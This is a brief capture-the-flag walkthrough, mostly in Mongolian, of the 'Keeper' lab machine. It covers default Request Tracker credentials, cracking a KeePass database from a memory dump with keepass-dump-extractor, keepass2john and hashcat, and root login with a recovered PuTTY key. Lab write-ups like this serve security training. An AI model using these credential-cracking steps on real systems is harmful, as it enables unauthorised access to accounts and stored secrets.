# Keeper - RT / Keepass.dmp

1. RT default credentials: `root / password`
2. Орох үед lnorgaard user-ийн нууц үгийг олж авдаг.

3. Keepass Dump файлаас wordlists гаргаж аваад crack хийнэ.

```bash
keepass-dump-extractor KeePass.DMP -f all > wordlist.txt

keepass2john passwords.kdbx > passwords.kdbx.hash
hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
```

Keepass.kdbx руу орсны дараа Putty итгэмжлэл байх бөгөөд тухайн PuTTY-User-Key-File-ийг Putty-д оруулж root эрхээр нэвтрэнэ.

[image]

## Exploited!

Putty → Connection → SSH → Auth → Credential → Browse this Putty private key file.

[image]
